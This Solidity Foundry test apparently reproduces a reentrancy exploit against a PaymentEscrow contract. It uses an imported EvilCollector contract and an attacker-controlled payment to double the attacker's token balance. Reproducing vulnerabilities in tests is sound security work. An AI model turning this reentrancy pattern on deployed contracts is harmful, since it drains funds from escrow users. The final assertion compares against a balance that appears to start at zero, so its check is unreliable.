// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.13;

import {PaymentEscrow} from "../../../src/PaymentEscrow.sol";
import {PaymentEscrowBase} from "../../base/PaymentEscrowBase.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
import {EvilCollector} from "../../../src/collectors/EvilCollector.sol";

contract ReentrancyRepro is PaymentEscrowBase {
    EvilCollector evilCollector;

    function setUp() public override {
        super.setUp();
        evilCollector = new EvilCollector(address(paymentEscrow));
    }

    function test_reentrancy() public {
        uint120 amount = 1000000000000000000;
        mockERC3009Token.mint(address(paymentEscrow), amount);
        mockERC3009Token.mint(address(evilCollector), amount);
        uint256 attackerPrivateKey = 0x123;
        address attacker = vm.addr(attackerPrivateKey);

        PaymentEscrow.PaymentInfo memory paymentInfo = PaymentEscrow.PaymentInfo({
            operator: attacker,
            payer: attacker,
            receiver: attacker,
            token: address(mockERC3009Token),
            maxAmount: amount,
            preApprovalExpiry: type(uint48).max,
            authorizationExpiry: type(uint48).max,
            refundExpiry: type(uint48).max,
            minFeeBps: 0,
            maxFeeBps: 0,
            feeReceiver: address(0),
            salt: 0
        });
        vm.warp(paymentInfo.authorizationExpiry - 1);

        bytes memory signature = _signPaymentInfo(paymentInfo, attackerPrivateKey);

        uint256 attackerBalanceBefore = mockERC3009Token.balanceOf(attacker);

        vm.prank(attacker);
        paymentEscrow.charge(
            paymentInfo, amount, address(evilCollector), signature, paymentInfo.minFeeBps, paymentInfo.feeReceiver
        );

        assertEq(mockERC3009Token.balanceOf(attacker), attackerBalanceBefore * 2);
    }
}
